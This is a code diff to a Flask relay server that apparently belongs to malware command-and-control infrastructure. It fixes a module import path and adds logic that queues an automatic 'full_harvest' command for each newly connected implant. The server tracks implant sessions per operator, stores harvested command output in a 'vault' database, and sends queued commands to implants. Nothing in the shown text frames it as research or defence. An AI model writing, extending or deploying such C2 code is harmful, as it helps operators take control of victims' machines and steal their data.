@@ -1,10 +1,17 @@
-# relay_server.py (Full Code - Simplified for Stability)
+# relay_server.py (Full Code - Corrected for Subdirectory Deployment)
+import sys
+import os
 import sqlite3
 import json
 import time
 import threading
 from flask import Flask, request, jsonify
 from werkzeug.security import generate_password_hash, check_password_hash
+
+# --- DEFINITIVE FIX for ModuleNotFoundError ---
+# This block adds the project's root directory to the Python path,
+# allowing it to find the 'database.py' module regardless of where this script is run from.
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 from database import DatabaseManager
 
 # --- Configuration & State ---
@@ -56,15 +63,16 @@ def handle_implant_hello():
         active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), **metadata}
         if is_new_session: print(f"[RELAY] New session online from user '{c2_user}': {session_id}")
     
-    # Store any results the payload might send (e.g., from a manual command)
     if "results" in data:
         for result in data.get("results", []):
             if "command" in result and "output" in result:
                 db.save_vault_data(session_id, result["command"], result["output"])
     
-    # Send any queued commands
     with cmd_lock:
+        if is_new_session:
+            command_queue.setdefault(c2_user, {}).setdefault(session_id, []).append({"action": "full_harvest", "params": {}})
         commands_to_execute = command_queue.get(c2_user, {}).pop(session_id, [])
+        
     return jsonify({"commands": commands_to_execute})
 
 @app.route('/implant/response', methods=['POST'])
